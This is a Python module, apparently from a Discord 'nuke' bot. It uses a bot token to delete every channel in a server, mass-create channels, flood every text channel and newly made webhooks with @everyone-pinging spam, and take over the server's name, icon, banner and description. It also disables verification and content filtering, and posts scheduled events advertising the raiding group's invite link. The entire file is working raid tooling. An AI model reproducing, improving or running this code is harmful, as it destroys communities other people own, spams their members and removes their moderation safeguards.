from __future__ import annotations
import asyncio
import os
import logging
import random
from typing import Optional

import aiohttp
import discord

from .settings import Settings, State, MISSING, now as utils_now

API = "https://discord.com/api/v10"


class Operations:
    def __init__(self, bot: discord.Client):
        self.bot = bot
        self.settings: Settings = Settings.load()
        self.session: Optional[aiohttp.ClientSession] = None
        self.token: str = ""

    async def setup(self):
        self.token = self._get_token()
        self.session = aiohttp.ClientSession(headers={"Authorization": f"Bot {self.token}"}, connector=None)
        logging.info(f"[ops] token={'set' if self.token else 'MISSING'}")

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    def _get_token(self) -> str:
        token = getattr(self.bot.http, "token", None)
        if token:
            return token
        for attr in ("_token", "__token"):
            t = getattr(self.bot.http, attr, None)
            if t:
                return t
        return ""

    def _pick_name(self) -> str:
        names = self.settings.channel_names
        return random.choice(names) if names else "fluked"

    async def CrChannel(self, guild: discord.Guild) -> int:
        count = self.settings.channel_count
        names_pool = self.settings.channel_names or ["fluked"]
        payload = {"name": "", "type": 0}
        tasks = []
        for i in range(count):
            base = names_pool[i % len(names_pool)]
            name = f"{base}-{i}" if count > len(names_pool) else base
            payload["name"] = name
            url = f"{API}/guilds/{guild.id}/channels"
            tasks.append(asyncio.create_task(self._post(url, payload)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
        logging.info(f"[CrChannel] {ok}/{count}")
        return ok

    async def DelChannels(self, guild: discord.Guild) -> int:
        tasks = []
        for channel in guild.channels:
            url = f"{API}/channels/{channel.id}"
            tasks.append(asyncio.create_task(self._delete(url)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
        logging.info(f"[DelChannels] {ok}")
        return ok

    async def spam(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if not text_channels:
            return 0
        payload = {
            "content": self.settings.spam_message,
            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
        }
        tasks = []
        for _ in range(self.settings.spam_count):
            for channel in text_channels:
                url = f"{API}/channels/{channel.id}/messages"
                tasks.append(asyncio.create_task(self._post(url, payload)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
        logging.info(f"[spam] {ok}")
        return ok

    async def mess_server(self, guild: discord.Guild) -> None:
        settings = self.settings
        server_banner = None
        server_splash = None
        server_icon = None
        icon_path = "assets/zne.png"
        banner_path = "assets/zne_banner.png"

        logging.info(f"[mess_server] enter guild={guild.id}")

        if os.path.exists(icon_path):
            with open(icon_path, "rb") as file:
                server_icon = file.read()

        if guild.premium_tier > 1 and os.path.exists(banner_path):
            with open(banner_path, "rb") as file:
                server_splash = file.read()
            server_banner = server_splash

        # delete existing scheduled events
        asyncio.create_task(self._delete_scheduled_events(guild.id))

        # create scheduled event
        event_payload = {
            "name": State.get_phrase(),
            "privacy_level": 2,
            "entity_type": 3,
            "scheduled_start_time": utils_now(seconds=3).isoformat(),
            "scheduled_end_time": utils_now().replace(year=2029).isoformat(),
            "description": "Join ZNE and start dominating servers today! https://discord.gg/Y6qZ4TKRM5",
            "entity_metadata": {"location": "https://discord.gg/Y6qZ4TKRM5 | https://zne.breed.rip"},
        }
        if server_banner is not None:
            event_payload["image"] = server_banner
        asyncio.create_task(self._create_scheduled_event(guild.id, event_payload))

        # edit guild
        edit_payload = {
            "name": settings.server_name,
            "description": "This place has been obliterated by https://discord.gg/Y6qZ4TKRM5. Join now if you want a bot like this.",
            "default_notifications": 1,
            "verification_level": 0,
            "explicit_content_filter": 0,
            "premium_progress_bar_enabled": True,
        }
        if server_icon:
            edit_payload["icon"] = server_icon
        if server_splash is not None:
            edit_payload["splash"] = server_splash
        if server_banner is not None:
            edit_payload["banner"] = server_banner

        url = f"{API}/guilds/{guild.id}"
        try:
            await self._patch(url, edit_payload)
        except Exception as e:
            logging.error(f"[mess_server] PATCH failed: {e!r}")

        logging.info(f"[mess_server] done")

    async def _delete_scheduled_events(self, guild_id: int):
        url = f"{API}/guilds/{guild_id}/scheduled-events"
        try:
            async with self.session.get(url) as res:
                if res.status != 200:
                    return
                data = await res.json()
            for ev in data:
                eid = ev.get("id")
                if eid:
                    asyncio.create_task(self._delete(f"{API}/guilds/{guild_id}/scheduled-events/{eid}"))
        except Exception:
            pass

    async def _create_scheduled_event(self, guild_id: int, payload: dict):
        url = f"{API}/guilds/{guild_id}/scheduled-events"
        try:
            await self._post(url, payload)
        except Exception:
            pass

    async def spam_webhook(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).manage_webhooks]
        if not text_channels:
            return 0

        # create webhooks
        webhook_tasks = [asyncio.create_task(self._create_webhook(c.id)) for c in text_channels]
        results = await asyncio.gather(*webhook_tasks, return_exceptions=True)
        valid = [r for r in results if not isinstance(r, Exception) and r]
        if not valid:
            return 0

        # spam webhooks
        send_tasks = []
        for _ in range(self.settings.webhook_count):
            for wid, wtoken in valid:
                url = f"{API}/webhooks/{wid}/{wtoken}"
                payload = {
                    "content": self.settings.webhook_message,
                    "username": self.settings.webhook_name,
                    "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
                }
                send_tasks.append(asyncio.create_task(self._post(url, payload)))

        results = await asyncio.gather(*send_tasks, return_exceptions=True)
        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
        logging.info(f"[spam_webhook] {ok}")
        return ok

    async def _create_webhook(self, channel_id: int):
        url = f"{API}/channels/{channel_id}/webhooks"
        payload = {"name": self.settings.webhook_name}
        try:
            async with self.session.post(url, json=payload) as res:
                if res.status in (200, 201):
                    data = await res.json()
                    return (data.get("id"), data.get("token"))
        except Exception:
            return None
        return None

    async def _post(self, url: str, payload: dict) -> bool:
        try:
            async with self.session.post(url, json=payload) as res:
                return res.status in (200, 201)
        except Exception:
            return False

    async def _delete(self, url: str) -> bool:
        try:
            async with self.session.delete(url) as res:
                return 200 <= res.status < 300
        except Exception:
            return False

    async def _patch(self, url: str, payload: dict) -> bool:
        try:
            async with self.session.patch(url, json=payload) as res:
                return 200 <= res.status < 300
        except Exception:
            return False
